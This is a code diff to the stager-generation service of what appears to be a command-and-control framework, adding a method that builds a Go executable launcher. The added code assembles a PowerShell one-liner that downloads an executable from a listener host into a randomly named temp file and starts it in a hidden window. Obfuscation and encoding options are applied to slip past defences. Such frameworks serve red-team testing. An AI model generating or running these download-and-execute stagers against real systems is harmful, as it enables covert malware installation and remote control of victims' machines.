@@ -229,6 +229,55 @@ class StagerGenerationService:
         # otherwise return the case-randomized stager
         return launcher
 
+    def generate_go_exe_oneliner(
+        self,
+        language,
+        listener_name,
+        obfuscate,
+        obfuscation_command,
+        encode,
+    ):
+        """
+        Generate a oneliner for a executable
+        """
+        listener = self.listener_service.get_active_listener_by_name(listener_name)
+
+        if getattr(listener, "parent_listener", None) is not None:
+            hop = listener.options["Name"]["Value"]
+            while getattr(listener, "parent_listener", None) is not None:
+                listener = self.listener_service.get_active_listener_by_name(
+                    listener.parent_listener.name
+                )
+        else:
+            hop = ""
+        host = listener.options["Host"]["Value"]
+        launcher_front = listener.options["Launcher"]["Value"]
+
+        launcher = f"""
+            # Create a temp file path
+            $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
+            $wc = New-Object System.Net.WebClient;
+            $url = "{host}/download/{language}/{hop}";
+            $wc.DownloadFile($url, $tempFilePath);
+            Start-Process -FilePath $tempFilePath -WindowStyle Hidden;
+        """
+
+        launcher = helpers.strip_powershell_comments(launcher)
+        launcher = data_util.ps_convert_to_oneliner(launcher)
+
+        if obfuscate:
+            launcher = self.obfuscation_service.obfuscate(
+                launcher,
+                obfuscation_command=obfuscation_command,
+            )
+
+        if encode and (
+            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+        ):
+            return helpers.powershell_launcher(launcher, launcher_front)
+
+        return launcher
+
     def generate_python_exe(
         self, python_code, dot_net_version="net40", obfuscate=False
     ):
@@ -701,8 +750,9 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
                 return full_agent
             return None
 
-    def generate_go_stageless(self, options):
-        listener_name = options["Listener"]["Value"]
+    def generate_go_stageless(self, options, listener_name=None):
+        if not listener_name:
+            listener_name = options["Listener"]["Value"]
 
         active_listener = self.listener_service.get_active_listener_by_name(
             listener_name
